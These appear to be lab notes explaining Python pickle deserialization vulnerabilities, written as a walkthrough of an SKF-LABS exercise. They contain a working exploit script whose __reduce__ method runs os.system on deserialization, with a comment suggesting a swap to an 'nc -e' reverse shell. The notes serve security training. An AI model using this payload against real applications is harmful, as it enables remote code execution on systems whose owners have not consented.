A **[[Pickle Deserialization]]** attack (**DES-Pickle**) is a type of vulnerability that can occur in Python applications using the Pickle library for object serialization and deserialization.

The vulnerability arises when an attacker can control the Pickle input passed to a deserialization function in the application. If the application code doesn't properly validate the Pickle input, it may allow an attacker to inject malicious code into the deserialized object.

Once the object is deserialized, the malicious code can execute within the application's context, potentially enabling the attacker to take control of the system, access sensitive data, or even execute remote code.

Attackers can exploit DES-Pickle vulnerabilities to perform denial-of-service (DoS) attacks, inject malicious code, or gain full system control.

The impact of a Pickle Deserialization attack depends on the type and sensitivity of obtainable data, but it can be severe. Therefore, Python application developers must properly validate and filter Pickle input passed to deserialization functions, and employ security techniques like resource limiting to prevent DoS attacks and disabling automatic deserialization of untrusted objects.

**LAB**  
- **SKF-LABS DES-Pickle**: [https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle)

![[Pasted image 20260212011400.png]]  
After researching Pickle and deserialization, we'll create a .py file:  
```python
import pickle      # Import the vulnerable library (serialization)
import os          # Import OS functions to execute commands  
import binascii    # (Optional) Useful for hex/base64 conversion

# Define a class. The name 'Exploit' doesn't matter - could be 'Test' or 'User'
class Exploit(object):
    
    # __reduce__ is a special Python "magic" method.
    # Runs AUTOMATICALLY when the victim attempts to read (deserialize) this object.
    # Tells Python: "To rebuild me, don't read my data - execute this function instead."
    def __reduce__(self):
        
        # Here we define what to execute on the victim's machine:
        # os.system -> Function that executes terminal commands
        # ('id',)   -> The argument (command) we pass. It's a tuple.
        # NOTE: For a reverse shell, we'd replace 'id' with the connection command (nc -e ...)
        return (os.system, ('id',))

# This ensures the code below only runs if we execute the script directly
if __name__ == '__main__':
    
    # 1. Create an instance of our malicious class: Exploit()
    # 2. pickle.dumps() converts this class to a byte string (serializes it).
    #    In doing so, it stores the malicious __reduce__ instruction inside.
    payload = pickle.dumps(Exploit())
    
    # Print the result.
    # THIS is what we'll copy-paste into the vulnerable web input (cookie, form, etc).
    print(payload)
```

This script will output a string we'll paste into the web form:  
![[Pasted image 20260212012628.png]]  
This returns a 0 (exit status code indicating success):  
![[Pasted image 20260212012641.png]]  

For full confirmation, we'll perform a reverse shell as a final step while setting up a listener:  
![[Pasted image 20260212012758.png]]  
![[Pasted image 20260212012819.png]]  
![[Pasted image 20260212012827.png]]  

This works because the code isn't sanitized and trusts user input. 